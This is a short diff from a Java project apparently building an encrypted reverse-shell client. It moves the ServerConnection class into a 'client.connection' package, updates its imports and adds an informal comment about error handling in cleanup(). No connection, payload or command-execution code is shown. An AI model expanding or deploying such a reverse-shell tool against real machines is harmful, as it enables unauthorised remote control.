@@ -1,11 +1,11 @@
-package obs1d1anc1ph3r.reverseshell;
+package obs1d1anc1ph3r.reverseshell.client.connection;
 
 import java.io.*;
 import java.net.*;
 import java.util.logging.Level;
 import java.util.logging.Logger;
-import obs1d1anc1ph3r.reverseshell.encryption.KeyExchangeHandler;
-import obs1d1anc1ph3r.reverseshell.utils.StreamHandler;
+import obs1d1anc1ph3r.reverseshell.client.encryption.KeyExchangeHandler;
+import obs1d1anc1ph3r.reverseshell.client.utils.StreamHandler;
 
 public class ServerConnection {
 
@@ -64,6 +64,7 @@ public class ServerConnection {
 	}
 
 	//I think this works, if it doesn't, then if it stops with errors, it's still stopped, so win win, I guess
+	//I have stopped it stopping with errors, for now, again, will probably have to fix again in the future
 	public synchronized void cleanup() {
 		try {
 			if (streamHandler != null) {
